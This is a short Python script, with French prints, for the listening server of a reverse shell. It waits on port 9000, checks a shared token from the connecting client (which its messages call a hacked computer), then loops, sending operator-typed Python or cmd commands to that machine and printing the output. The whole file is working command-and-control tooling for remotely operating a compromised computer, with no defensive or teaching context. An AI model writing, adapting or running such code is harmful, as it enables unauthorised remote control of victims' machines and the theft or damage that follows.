import socket

HOST = "0.0.0.0"
PORT = 9000
TOKEN = "SECRET_TOKEN"

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.bind((HOST, PORT))
    s.listen()
    print("Serveur prêt ecoute en cour")

    conn, addr = s.accept()
    print(f"Client pirater reverseshell actif : {addr}")

    with conn:
        token = conn.recv(1024).decode()
        if token != TOKEN:
            print("Token invalide")
            exit()

        mode = input("language (py/cmd) : ").strip()
        conn.send(mode.encode())

        print("ordi pirater ecriver du code (exit pour quitter)\n")

        while True:
            cmd = input(">>> ")
            conn.send(cmd.encode())

            if cmd == "exit":
                break

            try:
                result = conn.recv(16384).decode()
            except Exception as e:
                result = f"ERREUR RECEPTION: {e}\n"

            print(result, end="")
